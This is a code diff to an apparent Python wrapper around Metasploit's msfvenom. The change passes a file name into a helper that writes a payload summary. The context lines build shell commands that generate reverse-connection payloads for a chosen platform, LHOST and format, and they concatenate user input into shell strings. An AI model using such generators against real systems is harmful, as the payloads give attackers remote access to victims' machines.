@@ -590,7 +590,7 @@ def showInput():
                                 f"{pathData}&&cd/&&cd metasploit-framework/bin&&msfvenom -p {platformPayload} LHOST={ipaddressU} PORT=443 -f {formatPayload} > {name}" + "." + formatPayload)
                             mainPath = os.path.join(pathData, "metasploit-framework/bin")
                             mixPath = os.path.join(mainPath, name)
-                            makedirandmovefile(mixPath, platformPayload, formatPayload)
+                            makedirandmovefile(mixPath, platformPayload, formatPayload,name)
                         else:
                             cprint("Invalid format please type lsf to list all formats", "red", None, attrs=["bold"])
                             while formatPayload not in formatList:
@@ -611,7 +611,7 @@ def showInput():
                                         f"{pathData}&&cd/&&cd metasploit-framework/bin&&msfvenom -p {platformPayload} LHOST={name} PORT=443 -f {formatPayload} > {name}" + "." + formatPayload)
                                     mainPath = os.path.join(pathData, "metasploit-framework/bin")
                                     mixPath = os.path.join(mainPath, name)
-                                    makedirandmovefile(mixPath, platformPayload, formatPayload)
+                                    makedirandmovefile(mixPath, platformPayload, formatPayload,name)
                                 else:
                                     cprint("Invalid format please type lsf to list all formats", "red", None,
                                            attrs=["bold"])
@@ -637,7 +637,7 @@ def showInput():
                             f"{pathData}&&cd/&&cd metasploit-framework/bin&&msfvenom -p {platformPayload} LHOST={socket.gethostbyname(socket.gethostname())} PORT=443 -f {formatPayload} > {name}" + "." + formatPayload)
                         mainPath = os.path.join(pathData, "metasploit-framework/bin")
                         mixPath = os.path.join(mainPath, name)
-                        makedirandmovefile(mixPath, platformPayload, formatPayload)
+                        makedirandmovefile(mixPath, platformPayload, formatPayload,name)
                     else:
                         if formatPayload == "lsf":
                             print(formatList)
@@ -661,7 +661,7 @@ def showInput():
                                     f"{pathData}&&cd/&&cd metasploit-framework/bin&&msfvenom -p {platformPayload} LHOST={socket.gethostbyname(socket.gethostname())} PORT=443 -f {formatPayload} > {name}" + "." + formatPayload)
                                 mainPath = os.path.join(pathData, "metasploit-framework/bin")
                                 mixPath = os.path.join(mainPath, name)
-                                makedirandmovefile(mixPath, platformPayload, formatPayload)
+                                makedirandmovefile(mixPath, platformPayload, formatPayload,name)
                             else:
                                 cprint("Invalid format please type lsf to list all formats", "red", None,
                                        attrs=["bold"])
@@ -690,7 +690,7 @@ def cmd():
                     print(output.decode("utf-8"))
 
 
-def makedirandmovefile(nameofFile, selectedPayload, formatType):
+def makedirandmovefile(nameofFile, selectedPayload, formatType, nameOnlyOffile):
     mainPath = ""
     mainName = ""
     cprint("""
@@ -749,7 +749,7 @@ def makedirandmovefile(nameofFile, selectedPayload, formatType):
             else:
                 cprint("Invalid Command", "red", attrs=["bold"])
     data = f"""
-File-Name = {mainName}
+File-Name = {nameOnlyOffile}.{formatType}
 Payload = {selectedPayload}
 File extension/file format = .{formatType} 
 Path = {mainPath}
